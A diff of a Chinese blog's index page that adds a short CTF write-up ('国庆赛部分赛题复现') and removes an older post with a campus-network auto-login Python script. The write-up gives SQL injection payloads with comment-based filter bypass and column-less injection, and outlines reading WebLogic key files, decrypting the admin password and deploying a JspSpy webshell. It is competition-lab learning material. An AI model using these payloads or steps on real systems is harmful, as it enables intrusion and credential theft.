@@ -143,7 +143,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a></li>
         <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">47</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">48</span></a></li>
         <li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
         <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
       <li class="menu-item menu-item-search">
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -273,6 +273,134 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/bfdb9200/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Haorical">
+      <meta itemprop="description" content="ctf退役种子选手">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="中国熊猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/posts/bfdb9200/" class="post-title-link" itemprop="url">国庆赛部分赛题复现</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-10-13 19:05:32 / 修改时间：21:56:34" itemprop="dateCreated datePublished" datetime="2021-10-13T19:05:32+08:00">2021-10-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">ctf学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/posts/bfdb9200/" class="post-meta-item leancloud_visitors" data-flag-title="国庆赛部分赛题复现" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/posts/bfdb9200/#SOHUCS" itemprop="discussionUrl">
+        <span id="url::http://haorical.xyz/posts/bfdb9200/" class="cy_cmt_count" data-xid="posts/bfdb9200/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>868</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a target="_blank" rel="noopener" href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a target="_blank" rel="noopener" href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1475,128 +1603,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/cfeeb04a/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/cfeeb04a/" class="post-title-link" itemprop="url">python实现校园网自动登录</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-09-22 12:02:25 / 修改时间：12:52:34" itemprop="dateCreated datePublished" datetime="2021-09-22T12:02:25+08:00">2021-09-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/python%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index"><span itemprop="name">python实践</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/cfeeb04a/" class="post-meta-item leancloud_visitors" data-flag-title="python实现校园网自动登录" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/cfeeb04a/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/cfeeb04a/" class="cy_cmt_count" data-xid="posts/cfeeb04a/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.4k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p>
-<p>而且竟然能用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p>
-<p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后打包，设置开机自启动就行</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
@@ -1641,13 +1647,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">124k</span>
+    <span title="站点总字数">125k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:26</span>
+    <span title="站点阅读时长">3:28</span>
   </span>
 </div>
 <div class="busuanzi-count">
